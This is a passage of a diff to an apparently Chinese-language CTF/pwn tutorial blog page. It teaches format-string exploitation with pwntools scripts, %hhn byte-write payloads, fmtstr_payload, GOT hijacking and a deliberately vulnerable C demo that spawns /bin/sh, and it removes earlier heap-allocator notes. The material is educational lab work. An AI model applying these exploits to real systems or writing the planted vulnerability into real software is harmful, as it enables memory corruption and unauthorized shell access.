+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="si">%157c</span><span class="s2">%7$hhn</span><span class="si">%17c</span><span class="s2">%8$hhn</span><span class="si">%32c</span><span class="s2">%9$hhn</span><span class="si">%17c</span><span class="s2">%10$hhn&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行界面如下：</p>
+<p><img src="/p/pwn-3/24.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/24_hu_4a4975f1c8b437ab.png 480w, /p/pwn-3/24_hu_62021b927392440f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>这一个算是比较复杂的演示案例了，可以多试几次，我的步骤很详细了，如果还有疑问可以评论区讨论，作者看到会回答的😄。</p>
+<p>当然这个payload有点乱了啊，这里有一个整理好顺序的（运行结果都是一样的）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%223c</span><span class="s2">%7$hhn&#34;</span>   <span class="c1"># 写入a_address → 0xef</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%207c</span><span class="s2">%8$hhn&#34;</span>   <span class="c1"># 写入a_address+1 → 0xbe</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%239c</span><span class="s2">%9$hhn&#34;</span>   <span class="c1"># 写入a_address+2 → 0xad</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%49c</span><span class="s2">%10$hhn&#34;</span>   <span class="c1"># 写入a_address+3 → 0xde</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 第一个字节（a_address）：需要输出239字节，减去前缀16字节 → 239-16=223</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 第二个字节（a_address+1）：需要输出190字节，减去前面已输出的239字节 → 190-239= -49 → 因不能为负，加256（1字节范围）→ 207</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 第三个字节（a_address+2）：需要输出173字节，减去前面累计的190字节 → 173-190= -17 → 加256 → 239</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 第四个字节（a_address+3）：需要输出222字节，减去前面累计的173字节 → 222-173=49</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote class="alert alert-tip">
+    <blockquote>
+<p>比较推荐这样写（可读性强），连着写很容易出错的。</p>
+<p><strong>当前步骤需要输出的字符数 = 本次目标字节值 - 上一步累计输出数</strong></p>
+<p>（如果结果为负数，需要加 256 补正，因为<code>%hhn</code>只取单字节，范围 0-255）</p>
+</blockquote></blockquote>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p><code>%xc</code>中的<code>x</code>（即<code>c</code>前面的数字）是通过<strong>目标字节值</strong>和<strong>当前累计输出数</strong>反推出来的，核心是让<code>%hhn</code>执行时的 “累计输出总数” 恰好等于目标字节值（或对 256 取模后等于目标值）。下面用 “逆向计算” 的方式，一步步讲清楚每个数字是怎么来的。</p>
+<p><strong>核心公式</strong></p>
+<p><strong>当前步骤需要输出的字符数 = 本次目标字节值 - 上一步累计输出数</strong></p>
+<p>（如果结果为负数，需要加 256 补正，因为<code>%hhn</code>只取单字节，范围 0-255）</p>
+<p>前提：初始累计输出数</p>
+<p>payload 的前半部分是 4 个目标地址（<code>a_address</code>到<code>a_address+3</code>），每个地址用<code>p32()</code>转换为 4 字节，共<code>4×4=16字节</code>。这 16 字节会被程序当作输出内容，因此<strong>初始累计输出数为 16</strong>（在第一个<code>%hhn</code>执行前，这 16 字节已经被计算在内）。</p>
+<p><strong>逐行计算<code>c</code>前面的数字</strong></p>
+<p>假设我们的目标是向 4 个地址分别写入：</p>
+<p><code>a_address</code> → <code>0xef</code>（239）、<code>a_address+1</code> → <code>0xbe</code>（190）、<code>a_address+2</code> → <code>0xad</code>（173）、<code>a_address+3</code> → <code>0xde</code>（222）。</p>
+<ol>
+<li><strong>第一行：<code>%223c%7$hhn</code>（目标：239）</strong></li>
+</ol>
+<ul>
+<li>目标字节值：239（<code>0xef</code>）</li>
+<li>初始累计输出数：16（来自 4 个地址的 16 字节）</li>
+<li>需要输出的字符数 = 目标值 - 初始累计数 = 239 - 16 = 223</li>
+<li>因此用<code>%223c</code>，输出 223 个字符后，累计输出数 = 16 + 223 = 239，正好等于目标值，<code>%7$hhn</code>写入<code>0xef</code>。</li>
+</ul>
+<ol start="2">
+<li><strong>第二行：<code>%207c%8$hhn</code>（目标：190）</strong></li>
+</ol>
+<ul>
+<li>目标字节值：190（<code>0xbe</code>）</li>
+<li>上一步累计输出数：239（第一行结束后的总数）</li>
+<li>直接计算：190 - 239 = -49（结果为负数，说明需要 “绕一圈”，加 256 补正）</li>
+<li>实际需要输出的字符数 = -49 + 256 = 207</li>
+<li>输出 207 个字符后，累计输出数 = 239 + 207 = 446，446 对 256 取模 = 446-256=190，正好等于目标值，<code>%8$hhn</code>写入<code>0xbe</code>。</li>
+</ul>
+<ol start="3">
+<li><strong>第三行：<code>%239c%9$hhn</code>（目标：173）</strong></li>
+</ol>
+<ul>
+<li>目标字节值：173（<code>0xad</code>）</li>
+<li>上一步累计输出数：446（第二行结束后的总数）</li>
+<li>计算：173 - 446 = -273（负数，加 256×2 补正，因为 256×1=256 仍小于 273）</li>
+<li>实际需要输出的字符数 = -273 + 256×2 = -273 + 512 = 239</li>
+<li>输出 239 个字符后，累计输出数 = 446 + 239 = 685，685 对 256 取模 = 685-256×2=173，等于目标值，<code>%9$hhn</code>写入<code>0xad</code>。</li>
+</ul>
+<ol start="4">
+<li><strong>第四行：<code>%49c%10$hhn</code>（目标：222）</strong></li>
+</ol>
+<ul>
+<li>目标字节值：222（<code>0xde</code>）</li>
+<li>上一步累计输出数：685（第三行结束后的总数）</li>
+<li>计算：222 - 685 = -463（负数，加 256×2 补正，256×2=512＞463）</li>
+<li>实际需要输出的字符数 = -463 + 256×2 = -463 + 512 = 49</li>
+<li>输出 49 个字符后，累计输出数 = 685 + 49 = 734，734 对 256 取模 = 734-256×2=222，等于目标值，<code>%10$hhn</code>写入<code>0xde</code>。</li>
+</ul>
+<p><strong>总结：计算步骤</strong></p>
+<ol>
+<li>确定每个地址要写入的目标字节值（如<code>0xef=239</code>）。</li>
+<li>记录上一步结束后的 “累计输出总数”（初始为 16，之后是每步结束的总和）。</li>
+<li>用 “目标值 - 上一步累计数”，如果结果为负，就加上 256 的倍数（直到结果为正数），得到的就是<code>%xc</code>中的<code>x</code>。</li>
+</ol>
+<p>这样就能确保<code>%hhn</code>执行时，累计输出数恰好等于目标字节值（或取模后相等），从而精准写入想要的字节。</p>
+</blockquote></blockquote>
+<h2 id="got表劫持">.got表劫持
+</h2><p><img src="/p/pwn-3/25.png"
+	width="1019"
+	height="243"
+	srcset="/p/pwn-3/25_hu_642db382f68afc76.png 480w, /p/pwn-3/25_hu_ea082e0be13c5c64.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1006px"
+	
+></p>
+<p>在之前的讲解中，我们有讲过ELF文件中动态链接的函数调用的过程，在调用.plt的时候，会从got表中取值<code>jmp</code>，如果我们覆盖了.got表，就会跳转到我们指定的地址。</p>
+<h3 id="劫持方法">劫持方法
+</h3><h4 id="fmtstr_payload函数">fmtstr_payload函数
+</h4><p>在此前做过铺垫：利用格式化字符串进行任意地址内存覆盖。</p>
+<p>这里会通过覆盖大数字就可以对.got表进行覆写。对于<code>pwntools</code>提供了一个函数<code>fmtstr_payload()</code>用于生成进行任意地址覆盖的payload。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="p">{</span><span class="n">target_addr</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="o">|</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">writes</span><span class="p">,</span> <span class="n">numbwritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span> <span class="o">=</span> <span class="s1">&#39;byte&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>offset</strong>:格式化字符串所在的偏移。</li>
+<li><strong>writes</strong>:字典变量{address:value}代表将address位置的值改为value。</li>
+<li><strong>numbwritten</strong>:在进行格式化字符串之前已经输出的字符个数。</li>
+<li><strong>write_size</strong>:分别是byte short int对应的是<code>hhn hnn</code>。</li>
+</ul>
+<p>那就是说我们可以把exp优化一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">a_address</span><span class="p">:</span> <span class="mh">0xdeadbeef</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload是等效的，所以很方便，之前讲一大堆的<strong>格式化字符串漏洞利用</strong>是为了让你能明白其中原理。当然感兴趣可以去拆解<strong>fmtstr_payload</strong>函数，看看源码。</p>
+<h2 id="格式化字符串不在栈上的利用方式">格式化字符串不在栈上的利用方式
+</h2><p>printf函数的参数是format，类型是一个char*指针。大部分情况中，格式化字符串漏洞的格式化字符都是保存在栈上的，但有时也会出现格式化字符串并未保存在栈上的情况。</p>
+<p>这时的格式化字符串一般保存在.bss段或者保存在堆上。这些地址在栈上通过参数是无法访问到的，也就是说前面所讲的格式化字符串漏洞的利用方法很，多就无法使用了。</p>
+<p>来看下具体区别：</p>
+<p>在栈上：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x0</th>
+          <th>0x1C</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x4</td>
+          <td>0x1234</td>
+      </tr>
+      <tr>
+          <td>0x8</td>
+          <td>0x2121</td>
+      </tr>
+      <tr>
+          <td>0xC</td>
+          <td>0x3332</td>
+      </tr>
+      <tr>
+          <td>0x10</td>
+          <td>0x4441</td>
+      </tr>
+      <tr>
+          <td>0x14</td>
+          <td>0x1235</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0x3131</td>
+      </tr>
+      <tr>
+          <td>0x1C</td>
+          <td>%3$p</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>不在栈上：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x0</th>
+          <th>0x801020A0</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x4</td>
+          <td>0x1234</td>
+      </tr>
+      <tr>
+          <td>0x8</td>
+          <td>0x2121</td>
+      </tr>
+      <tr>
+          <td>0xC</td>
+          <td>0x3332</td>
+      </tr>
+      <tr>
+          <td>0x10</td>
+          <td>0x4441</td>
+      </tr>
+      <tr>
+          <td>0x14</td>
+          <td>0x1235</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0x3131</td>
+      </tr>
+      <tr>
+          <td>0x1C</td>
+          <td>0x4141</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>此时在栈上只有指向这个格式化字符串的参数、指针之类的：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x801020A0</th>
+          <th>%3$p</th>
+      </tr>
+  </thead>
+  <tbody>
+  </tbody>
+</table></div>
+<p>对于格式化字符串不在栈上的格式化字符串漏洞，我们无法通过自己在格式化字符串中写入一个地址来达到任意地址覆盖。</p>
+<p>这时候我们一般选择使用残留在栈上的地址来写入一个地址，从而达到任意地址内存覆盖的目的。</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>如果有嵌套的函数调用，栈上就会留存一个ebp/rbp链，他们都是栈地址，通过多次利用这里残留的栈地址，就可以做到任意地址写，过程简单来说就是下面这样，其中p2，p3都是栈上的地址。</p>
+<p>p4是目标地址</p>
+<p>p1中存放p2</p>
+<p>p2中存放p3</p>
+<p>通过p1更改p2的低地址使其指向p3，通过p2更改p3的值，使其指向p4，通过p3修改p4的值，即构造以下一个地址链：<code>p1-&gt;p2-&gt;p3-&gt;p4</code></p>
+</blockquote></blockquote>
+<p>要求：</p>
+<p>这种多次利用的手法需要存在多次格式化字符串漏洞，因为printf在解析格式化字符串的时候，对于%n、%hnn、%hn之类的地址覆写，是同时进行的而不是按从前向后解析。</p>
+<p>程序源代码demox.c:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">chr</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>      
+</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="n">secret</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xdeadbeef12345678LL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">chr</span><span class="p">,</span> <span class="s">&#34;bye&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="nf">gets</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>    
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>     
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编译：<a class="link" href="test_plus" >test_plus</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc demox.c -o <span class="nb">test</span> -m64 -no-pie 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>注意：</p>
+<p>进入IDA分析后，跟进vuln函数：</p>
+<p><img src="/p/pwn-3/26.png"
+	width="614"
+	height="284"
+	srcset="/p/pwn-3/26_hu_8cfc9a6904c93706.png 480w, /p/pwn-3/26_hu_8f8ebbaf985be4dc.png 1024w"
+	loading="lazy"
+	
+		alt="vuln函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p>按Y键修改成void类型，恢复成原样：</p>
+<p><img src="/p/pwn-3/27.png"
+	width="465"
+	height="160"
+	srcset="/p/pwn-3/27_hu_89e7b6b049f02a15.png 480w, /p/pwn-3/27_hu_ea32f4941b36b388.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="697px"
+	
+></p>
 </blockquote>
-<img src="9.png" style="zoom:150%;" />
-<h3 id="malloc运行流程">Malloc运行流程
-</h3><p>了解完各种bin之后，现在来看看这：</p>
-<p>一、当我们调用malloc时，程序都干了些什么？</p>
-<p>1、计算真正的堆块的大小（加上堆头部长度、对齐）：</p>
-<p>判断是否在fastbin范围内：</p>
-<ul>
-<li>
-<p>确定在，检查对应大小的bin链表中有无chunk。</p>
-<ul>
-<li>有，那就分配给用户，至此完成。</li>
-</ul>
-</li>
-<li>
-<p>如果不在fastbin范围内，或者没用chunk可用。（两者满足一个或者都满足的话）</p>
-<ul>
-<li>
-<p>继续判断是否在smallbin范围内：</p>
-<ul>
-<li>在smallbin范围内，检查对应大小的bin链表中有无chunk。
-<ul>
-<li>有chunk，那就取出来给程序，至此完成。</li>
-</ul>
-</li>
-<li>不在smallbin范围内，或者smallbin里面也没有chunk。这时候跳到unsortedbin的检查。</li>
-</ul>
-</li>
-<li>
-<p>unsortedbin中有无chunk？</p>
-<ul>
-<li>
-<p>有，从尾部取出第一个chunk，看看大小是否满足需求。</p>
-<ul>
-<li>满足，切分后大小是否大于<strong>minsize</strong>？
-<ul>
-<li>大于，再切分块，返回给用户，剩下的块放进unsortedbin。</li>
-<li>小于或等于minsize，直接返回给用户，完成。</li>
-</ul>
-</li>
-<li>不满足大小需求，把这个块放入smallbin / largebin对应的链表中，继续遍历下一个块。</li>
-</ul>
-</li>
-<li>
-<p>没。unsortedbin的所有块都不满足，那此时就判断是否在largebin范围。</p>
-<ul>
-<li>是，检查对应的bin链表中有无符合的chunk。
-<ul>
-<li>有符合的，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中。</li>
-</ul>
-</li>
-<li>不在，那就再次遍历smallbin / largebin找best fit的chunk。</li>
-<li>我去？还是没用，那就从<code>topchunk</code>中切割。</li>
-<li>？？搞什么鬼？？topchunk也不够？那就<code>mmap</code>系统调用</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>二、当我们调用了free时，程序都干了些什么？</p>
-<p>free的chunk大小属于fastbin吗？</p>
-<ul>
-<li>
-<p>是，放进fastbin，至此完成。</p>
-</li>
-<li>
-<p>不属于，那就接着判断这个free的chunk是否是mmap分配的。</p>
-<ul>
-<li>
-<p>是，那就调用munmap回收，完成。</p>
-</li>
-<li>
-<p>不是，那就接着判断前一个chunk是否是空闲的。</p>
-<ul>
-<li>
-<p>是，那就<strong>向前合并</strong></p>
-</li>
-<li>
-<p>不是，接着判断：后一个chunk是topchunk吗？</p>
-<ul>
-<li>
-<p>是，那就和topchunk合并，至此完成。</p>
-</li>
-<li>
-<p>不是topchunk，那就判断：后一个chunk是free的吗？</p>
-<ul>
-<li>是，那就<strong>向后合并</strong>，然后放进unsortedbin，终于完成了。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="堆动态保护机制的小总结">堆动态保护机制的小总结
-</h3><p>我的妈啊，难死我了，堆的内存管理机制比较复杂，多刷刷题吧，受不了了，刚开始就上强度了😫。</p>
-<blockquote>
-<p>我这里有一个发自内心的疑问：堆的本质是指针指来指去吗？O(∩_∩)O</p>
-<p>堆的本质可以理解为<strong>通过指针操作管理动态内存的机制</strong>，但 “指针指来指去” 只是其表现形式之一，更深层的本质是<strong>内存块的分配、释放和复用规则</strong>，以及攻击者通过破坏规则实现漏洞利用的过程。理解堆的核心在于掌握内存块的组织结构、堆管理器的行为逻辑，而非单纯的指针操作。</p>
-</blockquote>
-<h2 id="堆的调试方法">堆的调试方法
-</h2>
+<p>在IDA分析中，可以发现chr是全局变量不在栈上，在.bss字段上：</p>
+<p><img src="/p/pwn-3/28.png"
+	width="926"
+	height="143"
+	srcset="/p/pwn-3/28_hu_2aafe6b3b0cfc6c0.png 480w, /p/pwn-3/28_hu_7552f0dbf35ccd37.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="647"
+		data-flex-basis="1554px"
+	
+></p>
+<p>起草exp，开始gdb调试查看栈分布：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test_plus&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>断点选择printf的地址，第一次随便输入一点东西：</p>
+<p><img src="/p/pwn-3/29.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/29_hu_bbde4f4d11c96923.png 480w, /p/pwn-3/29_hu_90a07bf3b0cc2575.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>就挑这一条栈为例子吧：</p>
+<p><img src="/p/pwn-3/30.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/30_hu_2f7ea610333e0981.png 480w, /p/pwn-3/30_hu_debe8368fe143495.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>fmtarg查看偏移：</p>
+<p><img src="/p/pwn-3/31.png"
+	width="780"
+	height="99"
+	srcset="/p/pwn-3/31_hu_cc3b373211ba1b29.png 480w, /p/pwn-3/31_hu_675dcb96fff9d23b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="787"
+		data-flex-basis="1890px"
+	
+></p>
+<p>本案例不够明显，未完待续，作者正在努力刷题寻找案例&hellip;</p>
+
 </section>
 
 
@@ -1289,7 +2569,7 @@ ROP、shellcode、栈转移等。</p>
 
 
         <span>
-            最后更新于 2025-11-07
+            最后更新于 2025-11-11
         </span>
     </section></footer>
 
@@ -1334,71 +2614,47 @@ ROP、shellcode、栈转移等。</p>
             
                 
 <article class="has-image">
-    <a href="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.ee96c3422d2fcb13da9514744e2762a2_hu_179631d5777f326f.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post 给PWN新手的溢出魔法入门手册"
-                        
-                        data-hash="md5-7pbDQi0vyxPalRR0Tidiog==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">给PWN新手的溢出魔法入门手册</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
